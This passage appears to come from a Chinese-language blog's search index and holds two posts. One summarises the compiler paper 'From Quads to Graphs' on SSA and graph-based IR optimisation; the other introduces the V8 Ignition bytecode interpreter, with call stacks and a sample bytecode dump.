信息，无论是局部（在基本块中）还是全局（在过程中）。 我们可以考虑将 Parse（甚至四元组的 generate ）和 pessimistic optimizations 进行融合。During Parse，前端生成 basic blocks 和 instr。在生成 instr_A 时，前端立即在此 Block 中的前一个指令的上下文中检查指令，并立即进行窥孔优化，在 context window 中执行 instructions transform。Figure 3 展示了一种 during-parse 的窥孔优化。加入 use-def 信息等效于 context window 的拓展，允许非相邻代码的该类优化。 2.2 Use-Def Information显然，use-def 信息将极大地改善我们的窥视孔优化。不仅如此，Use-def 信息对许多其他类型的优化也很有用。use-def 信息没必要和 source 变量名一起储存，仅依靠源变量名信息就足以生成 use-def chains。我们只需要在四元组中向后搜索就能找到 def 指令。但是，向后搜索可能很慢（程序大小呈线性）。更糟糕的是，向后搜索可能得到模糊的结果，因为程序中可能存在多种 def 可以 reach 相同的 use。为了解决这个问题，我们引入 SSA。 3 Static Single Assignment适配 SSA 可以消除模糊的目标定义。在一个普通的程序中，一个变量可以沿着不同的控制路径（control path），或者说在不同的 basic block 中被多次定义。而在被转换为 SSA 形式时，某些 basic blocks 的头部会插入 Φ-function （在 4.1 中会具体描述），然后对所有的变量进行重命名。 Φ-function 被当作普通的的 instr 执行；且 Φ-function 的 opcode 与其他函数不同。Figure 4 展示了符合 SSA 的示例代码： 在重命名步骤之后，每个变量都精确地分配一次。且由于表达式只出现在赋值的右边，所以每个表达式都与一个变量（左值）相关联。也就是说，变量和表达式之间存在一对一的关联。因此，变量名可以当作“定义它的表达式”的直接映射（direct map）。 在我们的实现中，我们希望这种映射（mapping）越快越好。 在指令的具体实现中，我们会设计一个 field 用来存储源变量的名称（已经表示为 machine integers）。为了加快变量到定义的映射，我们用“指向变量定义指令的指针”（一个指向 instr 数据结构的指针）替换变量名。现在，执行从变量名到定义指令的映射需要单个指针，在这种方式下，use-def 链是显式编码的。Figure 5 展示了这种新的指令格式： 我们现在有一个从变量和表达式到指令的来回抽象映射。这意味着我们不需要额外的指令来对已经定义的变量名进行编码——转而使用上述的映射关系即可。因此可以删除 dst 字段（优化的时候不再需要具体的左值信息，仅依赖于 use-def ）。但是，During Parsing，前端也需要从变量名称到指令的映射（前端的变量名称表现为 machine integet）。于是需要 vn 到 instr 的映射表（parse 过程）。考虑到已经存在 vn -&gt; integer 的映射，我们需要构建一个 integer -&gt; instr 的映射。每次窥孔优化后我们都会更新该 map。 Figure 6 展示了新的 Parser 接口。由于现在我们使用的是 use-def 信息而不是 context window，因此我们不再需要 prev 指针。 【note】这里的 dst &amp; src 都是 integer ，并且对 instr 隔离。 3.1 Building SSA Form我们现在使用相对保守的方法来构建 SSA。我们的方法不需要分析整个程序，当然，在我们仍在 Parse 程序时这也是不可行的。变量的每个定义都被重命名为定义指令的地址（vn-&gt;instr | line 5），而且每个原始变量都映射到一个 integer 索引（vn:integer | line 3&amp;4），我们在索引的基础上使用一个简单数组来映射 def（ ==arr_of_mapping==[integer]=def | line 3&amp;4）。当我们找到现有变量的新定义时，我们更新 ==arr_of_mapping==. 在每个 Basic Block 的开头，如果我们将要处理同一个变量的两个定义时，我们就会插入 Φ-function。在嵌套的 if / then / else 结构中，我们将解析所有通向 merge point 的路径。然后检查所有变量以更改定义并且按照需求插入 Φ-function。在 loop head 和 labels 位置，我们必须先假设所有变量都定义在我们尚未解析的路径上，这造成我们需要插入很多冗杂的 Φ-function 。但该算法依然很快。 3.2 Pessimistic Optimizations with Use-Def Information现在 use-def 信息已经嵌入到 IR 中。有了这些信息，我们就可以分析相关指令，而不管它们的顺序如何（也就是可以放弃context window ？maybe），而且这种分析会比以往更加有效。Figure 7 展示了我们使用 use-def 信息的一个窥孔优化实例： 【参考 Figure 5 加速理解】 （during codegen当一条指令的状态是 unused （not codegen），我们总是返回一些 replace指令。replacement_instr 可以是之前定义的指令（可以理解为use original def ）。使用以前定义的指令而不是创建一个新的指令会缩小我们的代码大小（好像同时也会减轻优化的工作量）。我们下面列举了一下优化： Removing copies: 直接使用原始值而不是 copy。 Adding two constants：通常来说，只要原语的 source 均为constant，那么在编译时就可以把结果直接优化为 constant，也就是依靠计算机的机器指令来优化。 Adding a zero: not add，use original Value-numbering: value 编码会帮我们删除一些等效表达式，like line 5_if。所使用的方法是哈希表查找，其中 key 是从 data-input（or src）和 opcode 中计算出来的。因为我们 instr 结构中没有任何 control-data，我们可能会得到两个等价的但是毫不相关的表达式（不同的 control-path）。这种情况下，简单的 replace 就颇为不妥。为了修复这个问题，我们需要在每个 Basic Block 的末尾都刷新一遍 hash table。 Subtracting equal inputs: 3.3 Progress我们取得了很大的进展，不仅从instr_format中删除了 dst 字段，而且收集了 use-def 信息以供以后的 passes，并加强、加速了窥孔优化。然而，我们可以 do better。对于基本块中的指令，我们仍然有一个固定的顺序，操作逻辑还是依赖于 ==next== field。然而，当一个 Basic Blocks 被执行时，块中的所有指令都被执行。而对于超标量或 data-flow 机器，只要它们的 input dependencies 得到满足，就应该允许以任何顺序执行指令。 要纠正这一点，我们需要考虑指令是如何排序的。 4 Control-Flow-Dependence在到目前为止描述的 IR 中，基本块包含有序的指令列表。在某种意义上，这代表了 def-use 控制信息。basic block 从某种程度上 define 了control-flow，然后 instr uses that control。我们需要做的是抛开 basic block 这种隐式 control flow，转而为每一个 instr 建立相应的 control data。消除串行化控制依赖关系允许在 Block 中的 instr 可以不按顺序执行，只要它们的其他数据依赖关系得到满足即可。此外，我们希望这种数据关系与我们的依赖表示保持一致，并显式地使用 use-def 信息而不是 def-use 信息。 基本块中指令的有序列表被表示为 linked list 形式。每条指令都包含指向下一条指令的指针。我们用一个指向 Basci Blocks 结构本身的指针替换这个 next pointer，并将此指针视为指令的另一个 source of input：the control source。此时，每条指令都有 0~3 个数据输入和一个 control input。Figure 8 描述了这种新的结构。在该示例中，我们仅展示了一个基本块，但其中的 data inputs 可以位于任何基本块。 【左侧指针代表 control】 4.1 More-on-Φ-Functions首先明确什么是 Φ-Functions。举个栗子：这是一个适配了 SSA 的 CFG。现在面临的问题是： W2 &amp; Z1 的 Y_source是那条路经上的？ 因此我们引入 Φ-Functions ：这个函数将分析控制流信息，通过选择y1或y2来生成y的新定义y3。 也就是这样： —介绍结束 我们依然需要 CFG 的 edges 来帮助判断“模糊节点”并在其中加入 Φ-Functions。我们需要将来自相应基本块的 control input 与 Φ-instr 的每个 data input 相关联。这样做意味着 Φ-instr 将具有一组 input pair（two element）：分别是 control dependence 和 data dependence。这种具有复杂语义的结构显得很笨拙。下面我们看一种全新的结构。 我们将 Φ-instr 拆分成一组 Select 指令和一个 Compose 指令，每个指令都有简单的语义。Select 有两个 input： control dependence 和 data dependence。Select 计算的结果取决于 control。如果 control source 没有被执行，也就是说对应的 Basic Block 没有被 exec，那么不产生任何 value 结果。否则，data value 将被 pass up（自造词组2333）。紧接着，Compose 将 Select 的所有结果作为 input，并且 pass up 产生 value 的 Select 的结果。如 Figure 9 所示： WARMMING!!!这些指令（Select &amp; so on）没有 Run-time 操作,而且它们不是机器指令。它们的存在仅是为了帮助编译器理解程序语义。当最终的机器代码被fully generated，Select / Compose序列将被 folded back 回 basic blocks &amp; CFG。 4.2 Cleanup此时我们的 instr 已经较为完美了，其 use-def 信息包含了 data 和 control（针对use-def-of-control，可以理解为常规控制流图反过来的逻辑链）。另外，我们还有足够的信息保证 IR 的可加工性（因此很容易修改，例如，merge dead path）。但是，我们现有的的 Inst 类很难很好的抽象出各种不同的指令。我们将在下一节中讨论这个问题。 5 Engineering-Concerns我们注意到我们可以有好多不同的指令，每一种指令都有不同数量的 input。像 Compose 指令，可能有任意数量的输入；Negate 指令只有一个 input；而 Constant 指令（定义 one simple int）需要保存正在定义的 constant 的值，且没有其他的 input。为了处理所有这些差异，我们将 instrument 的定义分解为单独的、继承自基类 Inst的 class。 Figure 展示了了新的基类和一些继承的类。 我们使用的是函数式编程风格。我们创建并初始化了所有对象，但从未修改过。为了获得编译器对这种编程风格的支持，我们在类定义中插入了适当的 const 限定符。 【NOTE】 纯函数式编程中的变量不是命令式编程中的变量，而是存储状态的单元，是不可变的（immutable）。也就是说不允许像命令式编程语言中那样多次给一个变量赋值。 5.1 Virtual-Optimizations在 Figure 7 中的窥孔优化实例函数中，c++ 代码对每个对象类唯一的 opcode field 进行 switch。但在一个完整的实现中，switch 语句会变得相当巨大。另外，单个 opcode 的语义将被分为不同的 sections；一个 section 用于类定义，另一个用于窥孔优化。但我们更喜欢将 opcode 的所有语义放在一个地方:类成员函数。在 Figure 11 中，我们将 peephole function 分割成针对特定 opcode 的 virtual functions。 要使哈希表起作用，我们必须能够 hash instr 和比较指令。不同的类封装指令具有不同的哈希函数和不同的比较语义。举个栗子：ADD 的source value 无论顺序如何其整体散列值应该一致。Figure 12 展示了 virtual hash 和 compare functions。 5.2 Faster-Malloc每次执行新指令时，我们都会调用操作符 new 来获得存储空间。但他反过来又会调用 malloc，可能相当耗时。此外，窥孔优化经常删除新创建的对象，需要调用 free。我们通过为 Instr 类 hook 特定于类的操作符 new 和 delete 来加速这些频繁的操作。首先我们需要为这种 replace operate 分配一个 arena。Arenas 中包含具有相似生存周期的堆分配对象（instrs）。生存周期结束后，我们会 delete 整个 arena，从而快速地 free 掉内含的所有 object。如图13所示： arena-&gt;next = pre_arena Allocation 会检查当前 Arena 的空间大小。如果 Arena 没有足够的空间，则会在其中添加另一块内存。如果对象 fits，则返回对象地址的当前 hwm ，具体看代码。整体的 GC 风格是用内存指针的移动代替实际的内存分配释放。其中 Arena 的扩充以及 chunk chain 的释放算是唯二耗时的内存操作。 5.3 Control-Flow-Issues通过上述这些更改，我们的 IR 的整体设计终于变得清晰起来。每条指令都是一个独立的C++ object，其中包含确定 instr 如何与其周围的程序交互所需的所有信息。instr 的主要字段是 opcode。opcode_class 决定指令如何传播常量、处理代数恒等式并找到与其他指令一致的地方。为了使 IR 适配一种新的操作，我们需要定义一个新的 opcoded 和类——该类需要采集 data field 作为 intr’s input，而且需要提供窥孔优化以及 value-numbering 接口（hash），而不需要对窥孔或 value-numbering 本身进行任何更改。所以现在的 IR 具有相当强的可维护性。 6 Two-Tiers-to-One我们的 IR 有两个不同的 level：top_level，CFG 包含 Basic Blocks；bottom level，Basic Blocks包含 instr。过去，这种 seperate 对于 concerns 的分离很有用—— CFG 处理 conrtol flow，基本块处理 data flow。但是，我们希望用相同的机制处理这两种 dependence，因此我们需要消除这种壁垒。 先来看看 instr 怎么处理。抽象点来说，每个 instr 都可以当作一个 node 。 instr 的每个 input 都表示从定义指令的节点（def）到该指令的节点（use）的一条边（def -&gt; use 边）。edge 的方向正好和 instr 中的 input_pointer（use-def chain）的方向相反。这并不矛盾：我们恰好正在定义这样一个 abstract graph。像 Figure 14 所描述的那样，这个 “graph”的具体实现是从 sink到 source (use to def) 的 edge 遍历，而不是从 source 到 sink (def to use)。 为了确定何时执行，每个 instr 都要从 Basic Blocks 获取一个 control input。如果 input 是抽象图中的一条边，那么基本块必须是抽象图中的一个节点。所以，我们定义一个 Region instr 来替换基本块。 Region 指令将来自每个predecessor block 的 control 作为输入，并产生 merged control 作为输出。 由于 Region instr 作用是合并 control inputs，因此不局限于 separate control input 来确定何时执行。因此 control input 字段就可以移动到具体的 class-specific instr_class。Figure 15 展示了这种变化： 如果basic blocks 以条件指令结尾，我们就把条件指令换作 IF。Figure 16 展示了 IF_instr是如何工作的。 左侧是这样的逻辑：predicate 提供 condition 判断语句，branch 将 control-flow 引导至不同的 block。然鹅通过显式的 control edge，IF instr 接受 control input 和 predicate 输入，然后产生 out-control 传递给不同的 Region。 【NOTE】这种转化后，其实该 graph 还是双层网状结构，只不过操作逻辑变成单一维度。 6.1 A-Model-of-Execution在放弃基本块和 CFG 之后，我们的执行模型是什么？我们从中间表示的设计历史中获取线索。其实和四元组一样，我们的 IR 模型还是有两个分开的部分。就像 Figure 15 源码所述，我们只是在操作逻辑相同的单个 graph 中嵌入了两层 representation 维度。也就是说，我们的优化操作并不将这两层 subgraphs 区分开来，只是针对不同的 opcode 有不同的接口。 control subgraph 使用 Petri net 模型。 随着 exec 的进行，control token 在节点之间移动。这反映了 CFG 的工作方式：control flow 即 Basic block exec 顺序。control token 只存在于 Region / If / Start 指令中。Start 基本块被替换为产生初始 control token 的 Start 指令。随着指令的 exec，control token 也会随之前进。如果该 token 遇到了 STOP 指令，则执行停止。由于我们是使用 CFG 构造了当前 graph，所以我们确保在当前指令的所有传出边（control out）上只存在 Region / If / Stop 。 data subgraph 不使用基于 token 的语义。 data node 的输出是其 input 和 function（opcode）的直接反映。因为没有记录状态的 token 存在，因此就不存在 Petri net。在每个 out edge 上，data value的数量都是无限的。直观地说，当一条指令需要 data instr 的值时，它会沿着 use-def 追溯到该 instrs，并读取存储在那里的值。在无环图中，这种根到叶的变化波动非常快。当数据值的传播趋于稳定时，control token 移动到下一个 Region 或 If 指令。Graph 中不可能只包含 data node ，每个循环都有 Compose / Region 指令 两个 subgraph 在两种不同的指令类型中混合：Compose/Select 指令和 If 指令。Compose / Select 组合读入 data 和 control ，并输出 data value。Select 不使用 control token，但会检查是否存在 control token。Select 的out 只有两种，一种是 data input 的拷贝，另一种就是 no-value。这当然取决于 control token 的存在与否。 Compose 输出它们的 previous value 或 present value。 IF 指令同时接受 data 和 control token ，并持有 True/False control token。两个可能的后继 region 只有一个能起到作用。在 Section 8.1，我们修改了 If 指令，使其行为更像其他 control handling 指令：给与两个后继，只有一个接收 control token。【图 9 和图 16 可以结合】 Figure 17 展示了一个简单的循环。Region 指令代替 Basic Blocks 作为 head 来处理该 loop 的 control-flow。Region &amp; If 构成 loop 的简易 control 框架；Select &amp; Compose 用来处理 SSA 形式下的变量混淆，接受的 control 参数分别为开始时的 Start 和 经历了 loop 的 If-false-control-out，对应的 data input 分别为 i0 和 i2。注意判断语句是作为 If_input 的 predicate ，outer 为 data。 6.2 Control-Based-Optimizations把 control 信息作为显式输入意味着我们可以在优化中使用它。一个具有 Constant test 的 IF 语句只能产出两个 control outs 中的一个，其中“live”边的 control out 就是 If 的 control in 的拷贝，而 If 则会在 dead 边的 head 部分输出 NULL（dead-out）。在我们讨论如何处理 If 的两个不同输出之后，图 24 提供了执行此操作的代码。（现在不急） 在做针对 ADD 的窥孔优化时，我们可以检查我们正在 Parse 的代码是否已经处于 dead 状态并立即将其删除。例如，当 DEBUG code 被编译出来，程序员将常量值传递给各种 flag 位时，可能存在某些选项 flag 为 0 的状况。然后相应地，If 产生 dead out，之后的 code 通过判断 dead out 将相应的 instr 删除（包括但不局限于 ADD）。 如 Figure 18。 注意，我们返回 NULL 作为 unreachable instr 的定义指令。这意味着任何优化 unreachable instr 的尝试都将使用 NULL，fail 无疑。这种直觉是正确的：无法访问的代码永远不会执行，所以我们永远不应该尝试使用这样的代码。为了简洁起见，我们将在以后的示例中跳过对于 control inputs 是否为 Null 的检测。使用这些 NULL data values 的 Select 指令的 control inputs 同样为 Null（Null data 存在于 dead-path），因此也是 unreachable 的（从 control-flow 角度）。Compose instr 检测来自 Select 的 input：如果为 Dead，则直接移除。 Region 和 Compose 指令可以以类似的方式进行优化。Null input（dead-path）可以直接移除。如果 Region 和 Compose 的 input 是单一的，那么可以直接移除该 instrs（control token 均为拷贝）。在 Parse 过程中进行这些优化需要前端确认之后没有其他的 control path 可以到达 merge points。针对 if / then / else 这种结构化代码对应的 merge points，与其有关的所有 control-path 都是已知的。在解析完到达 merge points 的所有路径之后，可以优化 Region 和 Compose 指令。而针对 label 对应的 merge point，前端只有在全部解析完 label 所在的 scope 才会进行优化。 6.3 Value-Numbering-and-Control如果我们把 control input 信息嵌入到 value numbering’s hash 和 key-compare functions 中，那么我们就可以避免位于不同基本块的等价 instr 的混淆，因此也就不需要再每个基本块结尾进行 hash table 的 flush。然鹅，这依然还只是本地的 value numbering。放弃 control 并且做到全局的 value numbering 我们将在 Section 9 中介绍。 6.4 A-Uniform-Representation现在，我们使用了相同的 Inst 类来表示整个程序。control 和 data flow 统一表示为图中节点之间的边。从现在开始，我们会对 graph 进行细化，但我们不会对其进行任何重大更改。 在完成四元组到 graph 的转换之后，我们得到了什么？在下一节中，我们将看到有关窥孔优化的通用代码。此代码适用于所有指令类型，添加新的指令类型（或操作码）也不需要对其做任何更改。其工作包含：value-numbering ，constant folding 和 eliminating unreachable code. 7 Types-and-Pessimistic-Optimizations我们以前的 vpeephole 结合了 constant folding 和 identity-function（对相同函数进行优化）。在 Section 10 中，conditional constant propagation 不能使用 identity-function 优化而且只需要 constant-finding 代码。所以我们 break up 原本 vpeephole 中的优化函数，将其分为两种：进行 constsnt folding 的 Compute 以及进行 identity-function 的 Identity。Compute 产生的 constant 被储存在 type 结构中。 type 就是一组值。我们感兴趣的是在 run-time 中的 value 以及类型。其结构如下： 上下两个符号与 control flow 相关联，分别代表 control 的 unreachable 和 reachable but not constant。 identity-function 优化和 Compute 的代码如图 20 所示： 如果 Identity 判断指令 x-instr 是某个其他指令 y-instr 的等效函数，则删除 x 并返回 y 来作为 x 的替代。删除 x-instr 并返回 y-instr 的操作仅在其他地方没有针对 x-instr 的引用的情况下有效（否则我们有空指针指向 x）。 因此，只有在我们最近在 Parse 期间创建了 x 时才能使用 Identity 代码。由于我们的目标是 during parsing 的优化，因此无伤大雅。 // 如果 instr 的 src 的 type.height 其中一个为 TOP，则无法继续常量折叠； 如果 instr 的 src 的 type.height 其中一个为 bottom，则无需继续常量折叠 7.1 Putting it Together: Pessimistic Optimizations我们的下一个窥视孔优化器的工作原理如下： 为每个 instr 进行 Compute Type 如果指令的类型是常量，则用 Constant 指令替换掉。先删后填使 new 和 delete 可以重复使用内存。这也意味着我们需要在删除之前保存相关的常量。 对 instr 进行 Value-numbering，尝试寻找以前存在的可替换的指令。我们在 old instr 上无需使用 Identity-function 优化，因为在其进入哈希表之前肯定经历过该类优化。 identity-function 优化。 如果我们没有找到替换指令，我们必须计算一个 hash value，并将其插入 hash table。 返回 optimized instruction 7.2 Defining Multiple Values我们已经实现了我们的设计目标之一：使窥孔优化的代码简单和直接。根据我们的经验，这个窥孔优化将程序峰值内存大小（和运行时间）减少了一半。 然鹅，在我们现在的 IR 中对 IF 的处理还不够完善。IF 产生两个 seperate result。 If 的 user 被分为两组，具体的访问取决于他们可以得到的 result。到现在为止，没有任何一个非 If instr 具有这样的指令行为。在下一节中，我们将介绍几种产生多个值的指令类型，并尝试找到一种统一的解决方案来选择该类 instr 的 result。 8 More Engineering Concerns在最初的基于四元组的实现中，有好几种定义多个 value 的 instr。 例如，设置条件代码寄存器以及计算结果（即减法）和子程序调用（至少设置结果寄存器，条件代码和内存）的指令。以前，这些指示是在特别的 basis 上处理的，而如今我们要使用更正式的方法。 单个指令，例如 If ，产生多个不同的值（ true/false control-out ）是一件很令人头疼的问题。当我们引用这样的一条指令时，指的是哪个输出呢？我们通过引入“单个元组值（tuple）”来统一代替这样的 multi-defining 指令产生的 outs 来解决这个问题。然后我们使用 Projection 指令去掉我们想去掉的 piece of the tuple。每个 Projection 指令从 defining instruction 中获取 tuple 并生成一个简单 value。 Projection instr 没有 run-time 操作，换句话说，其运行在 zero cycles。如果都用 machine code 表示的话，tuple-producing 指令就是一个产生多个 result 的 machine code。而 Projection 仅仅是为不同的 result 指定不同的名称。 tuple-producer 的工作之一就是为 Projection Compute a new Type。该 Projection 指令的 Compute 代码通过将 Projection 传递给 tuple-producer 的 Compute，让 tuple-producer 确定 Projection 的 Type 并且使用该结果。由于 non-tuple-producing 指令永远不会成为 Projection 的目标，因此默认值是一个 ERROR，如图 22 所示。Identity 的处理是类似的。 8.1 If InstructionsIf 指令接收 predicate 和 control input，并产生 true/false 两个 control out。分配给True/False-Projection 并插入 Region 作为后继。示意图和代码如下： 8.2 Projection Instructions通过对 Projection 的定义，填补了我们模型中的一个主要空白。我们现在有关于 peepholer 如何查找和删除 unreachable code 的具体代码。到目前为止，每个 data 指令都包含一个 control input ，该 input 从本质上定义了指令属于哪个基本块。但在许多情况下，我们并不关心指令被放置在哪个块中，只要它在数据依赖关系得到满足和任何 uses 之前被执行即可。下一节中，我们就要删除 control input。 9 Removing Control Information在我们的模型中，我们要求每个数据计算都有一个 control input ，以确定数据计算什么时候应该执行。事实上我们可以从数据计算中删除 control input ，并且完全依赖于 data dependence 。当然，这样做优缺点并存。优点是： 图中较少的 edge 意味着较小的图形、较少的构建和操作工作。 value numbering 的工作原理是找到congruent（一致性的）sub-graph 段，其中 congruent （一致性）被定义为“一致性输入上的相等函数”。而一旦失去了 control input ，hash 就难以保证来源的差异性。所以 pessimistic value numbering 就要和 global value numbing 一样强。 缺少控制输入时，只剩下数据输入。计算中不再有”所属的基本块”的概念。跨基本块执行代码移动的调度器不需要知道指令有多大的自由度；这些信息是显式的。 缺点是： 好无聊啊不想写2333 10 Optimistic TransformationsOptimistic transformations，例如稀疏条件常数传播（Sparse Conditional Constant Propagation），会在优化过程中做出 optimistic assumptions 并尝试证明，有时可能需要分析整个程序以进行验证一个猜测。因此，我们需要在每条指令中保留有关当前 assumptions 的一些信息。该信息存储在 Type 字段中， Type 字段由前面定义的 Compute 设置。 我们依靠 pessimistic analysis 避免的这种 global analysis 的另一个条件就是需要就是 def-use edges。到目前为止，我们所有的优化都只能在给定一个 instr 和它的直接 uses 成分（即给定 use–&gt;def edges） 条件下执行。对于 optimistic transformations ，我们假设所有指令都是 undefined 以及所有的 code 都是 unreachable 。然后从 Start 开始，我们开始逐步验证并修改这些假设。当我们发现一条指令定义了除 “top” 以外的值时，我们就必须 inspect 所有使用该值的指令的 assumptions。因此我们需要 def-use edge。 因为我们需要全局(批处理)算法的 def-use edges，所以我们要一次性找到它们并将 single insruction 的 def-use edges 按照顺序放入一个大数组中。 要访问 该 instr 的 edges，我们需要指令中的 start 和 length 部分。因此我们为 instrument 引入了两个新的 field ：def_use_edge 和 def_use_cnt（count）。 我们通过遍历 graph 的 use-def edges 来找到 def-use edge。要进行图形遍历，我们需要一个 visit flag，一个 use-def edge 计数器，以及一个通过 index 访问 use-def edges 的函数。新构建的 instr 如下图所示： 我们在图 27 中构建了def-use edge。我们需要使用 Stop 指令和 use-def edge 的数量作为输入以及构建一个空数组来保存 def-use edges。首先通过对 Graph 的一次遍历 pass，count 每个 Inst 的 def-use edges。在此步骤中，我们还将所有 Type 初始化为 “Top”。在第二次 pass ，我们将 edge value 存储到数组中，将数组部分的开始部分存储到 Inst 里去。因为我们从 Stop 指令开始所有的遍历并且只沿着 use-def edges 行进，所以我们不会访问到 dead code。也就是说，我们也不会将其将其表示出来。这就等同是在 SCCP 之前进行了一次 dead code elimination。 接下来,我们运行 SCCP。我们把 start 指令放在 worklist 上。然后我们进入一个简单的循环：我们从 worklist 中提取一条指令，为其 compute 一个新的 Type ，如果与默认值不同，则将该指令的所有 uses 放回 worklist 中。当该 list 清空时，工作就完成了。 10.1 The Payoff Summary为了得到更快的 optimiser，我们决定在 front-end 做一些工作。我们推断，在 Parse 过程中进行的窥孔优化将减少 IR 的大小和后期优化阶段的开销。 我们以SSA形式进行了前端构建。因为我们在 Parsing 时无法分析整个程序，所以必须插入很多的 Φ-Functions 。我们注意到 variable names 是程序表达式的一对一映射。，因此我们用 instr-pointer 来进行替换。此时表达式中的 name 字段就显得毫无用处，因此我们果断的进行 dst 的删除。我们还观察到了 basic blocks 内的隐式控制流，我们对此进行了显式控制（因此需要进行优化）。我们还发现，在尝试编写 unreachable code elimination 的窥孔优化时，我们的模型是 non-compositional（分离操作的属性，可进行显式的操作），我们通过在 Φ-Functions 中引入 control 并将其分解为 Select 和 Compose 两条指令来解决这一问题。 紧接着我们利用了c++ 的继承机制，并将 Insts 重新构造为单独的类以用于每一种 instr。我们还插入了专门的 new 和 delete 功能。 这时候我们注意到 Basic Block 结构只包含了一些 typical dependence，这和一个典型的 instr 没有什么两样，因此我们直接将其替换为 Region 。因此我们一直使用的窥孔优化现在允许我们除常规的 constant fold 和 value numbering 之外进行 unreachable code elimination。 我们将每条指令的 peephole 分解为 constant folding（compute）和 identity-function 优化。其中的 constant folding 在 global opt 中被使用。 最后我们优化了SCCP。 ReferenceFrom Quads to Graphs: An Intermediate Representation’s Journey","link":"/2018/09/03/IR's-Journey/"},{"title":"V8 Iginition Interpreter","text":"Intro: Analysis of Ignition 什么是字节码解释器？解释器是一种顺序执行源代码的引擎。在过去的V8中，源代码被立即编译到汇编程序并执行，但与之不同，解释器将源代码转换为高级字节指令并按顺序执行字节指令。感觉就像一个高级汇编程序。 Ignition概要Ignition是一个基于寄存器的字节码解释器。与Java的堆栈基础不同，它实际上将值分配给CPU的寄存器并执行它们。在Ignition中，预先生成一个名为BytecodeHandler的字节码处理函数，从字节码中获取数组索引，并将生成的处理函数分配给索引，一个接一个地循环Bytecode数组，并使用相应索引的函数执行调用代码。简化版本的js代码如下：1234567891011var Bytecodes = [0,1,2,3,4,5];var index = 0;function dispatch(next) {BytecodeHandlers[next]();}const BytecodeHandlers = { [&apos;0&apos;]() {...; dispatch(Bytecodes[index++])}, [&apos;1&apos;]() {...; dispatch(Bytecodes[index++])}, [&apos;2&apos;]() {...; dispatch(Bytecodes[index++])}, [&apos;3&apos;]() {...; dispatch(Bytecodes[index++])}, [&apos;4&apos;]() {...; dispatch(Bytecodes[index++])}, [&apos;5&apos;]() {...; dispatch(Bytecodes[index++])},} Ignition结构字节码生成的函数调用Ignition 从Javascript AST 生成 bytecodes 检查这个bytecodes生成步骤。 由于BytecodeGenerator实现了AstVisitor，在Javascript AST中运行时创建相应的字节码。 BytecodeGenerator位于src / interpreter / bytecode - generator.h中 字节码生成方法是BytecodeGenerator :: GenerateBytecode。 InterpreterCompilationJob :: ExecuteJobImpl（src / interpreter / interpreter.cc）中调用BytecodeGenerator :: GenerateBytecode。 InterpreterCompilationJob :: ExecuteJobImpl由静态Interpreter :: NewCompilationJob执行。 Interpreter :: NewCompilationJob的层次结构如下。12345Interpreter::NewCompilationJob|InterpreterCompilationJob::ExecuteJobImpl|BytecodeGenerator::GenerateBytecode 由于这个静态Interpreter :: NewCompilationJob是一个在编译器管道中生成Job的方法，让我们看一下compiler.cc（src / compiler.cc）。compiler.cc（src / compiler.cc）有一个非常复杂且难以理解的调用层次结构，并且与可选的设置解析器设置一起读取也很困难。调用堆栈如下所示。123456789101112131415161718192021ScriptCompiler::Compile|ScriptCompiler::CompileUnboundInternal|Compiler::GetSharedFunctionInfoForScript|Compiler::CompileToplevel|CompileUnoptimizedCode(compiler.cc)|CompileUnoptimizedInnerFunctions|GenerateUnoptimizedCode|GetUnoptimizedCompilationJob|---- Iginitionオプションによってfullcodegenと分岐| |Interpreter::NewCompilationJob | FullCodeGenerator::NewCompilationJob ScriptCompiler :: Compile是V8的Javascript编译器的入口点，并按顺序调用该函数，最后创建Job of Interpreter。 到最终的BytecodeGenerator :: GenerateBytecode的调用堆栈如下。 12345678910111213141516171819202122232425ScriptCompiler::Compile|ScriptCompiler::CompileUnboundInternal|Compiler::GetSharedFunctionInfoForScript|Compiler::CompileToplevel|CompileUnoptimizedCode(compiler.cc)|CompileUnoptimizedInnerFunctions|GenerateUnoptimizedCode|GetUnoptimizedCompilationJob|---- Branch with fullcodegen by Iginition option| || FullCodeGenerator::NewCompilationJob|Interpreter::NewCompilationJob|InterpreterCompilationJob::ExecuteJobImpl|BytecodeGenerator::GenerateBytecode 字节码生成现在我们知道调用层次结构，看看如何生成字节码。由于字节码生成继承自前面编写的AstVisitor，因此有Visit必要实现各种方法。JavaScript代码：1var a = 1; 字节码123456789101112131415161718192021222324250 [generating bytecode for function: ]1 Parameter count 12 Frame size 323 0x3f5e20aafdf6 @ 0 : 09 00 LdaConstant [0]4 0x3f5e20aafdf8 @ 2 : 1f f9 Star r15 0x3f5e20aafdfa @ 4 : 02 LdaZero6 0x3f5e20aafdfb @ 5 : 1f f8 Star r27 0x3f5e20aafdfd @ 7 : 20 fe f7 Mov &lt;closure&gt;, r38 0x3f5e20aafe00 @ 10 : 55 aa 01 f9 03 CallRuntime [DeclareGlobalsForInterpreter], r1-r39 0 E&gt; 0x3f5e20aafe05 @ 15 : 92 StackCheck10 116 S&gt; 0x3f5e20aafe06 @ 16 : 09 01 LdaConstant [1]11 0x3f5e20aafe08 @ 18 : 1f f9 Star r112 0x3f5e20aafe0a @ 20 : 02 LdaZero13 0x3f5e20aafe0b @ 21 : 1f f8 Star r214 0x3f5e20aafe0d @ 23 : 03 01 LdaSmi [1]15 0x3f5e20aafe0f @ 25 : 1f f7 Star r316 0x3f5e20aafe11 @ 27 : 55 ab 01 f9 03 CallRuntime [InitializeVarGlobal], r1-r317 0x3f5e20aafe16 @ 32 : 04 LdaUndefined18 118 S&gt; 0x3f5e20aafe17 @ 33 : 96 Return19 Constant pool (size = 2)20 0x3f5e20aafda1: [FixedArray]21 - map = 0x1cfd2a282309 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;22 - length: 223 0: 0x3f5e20aafd71 &lt;FixedArray[4]&gt;24 1: 0x2315b1a87ef9 &lt;String[1]: a&gt; here，函数名称输入到函数字节码中。 0 [generating bytecode for function: ] 这是堆栈的参数数量。该字节码是全局的，所以忽略它。 1 Parameter count 1 FrameSize是已分配寄存器的数量*指针大小。指针大小大致相同，32位为4字节，64位为8字节。在这种情况下，由于分配的寄存器数是4 64位环境，因此指针大小为8字节124 * 8 = 32。2 Frame size 32 每个字节串是当前地址的偏移字节码的数字字节码名称操作数。3 0x3f5e20aafdf6 @ 0 : 09 00 LdaConstant [0]这是常量值池的内容。在此示例中，变量名称为a。12345619 Constant pool (size = 2)20 0x3f5e20aafda1: [FixedArray]21 - map = 0x1cfd2a282309 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;22 - length: 223 0: 0x3f5e20aafd71 &lt;FixedArray[4]&gt;24 1: 0x2315b1a87ef9 &lt;String[1]: a&gt; 